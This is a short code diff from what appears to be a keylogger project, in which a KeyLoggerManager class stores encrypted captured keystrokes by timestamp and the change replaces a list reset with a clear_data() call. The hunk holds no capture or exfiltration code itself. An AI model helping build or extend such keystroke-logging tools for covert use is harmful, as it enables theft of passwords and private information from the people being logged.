@@ -42,7 +42,7 @@ class KeyLoggerManager:
 
         if encrypted_data is not None:
             self.data_dic[timestamp] = {"key_data": encrypted_data}
-        self.service.list_data = []
+        self.service.clear_data()
         print(f"Added {len(logged_keys)} keys to the dictionary.")
 
     def save_locally(self):
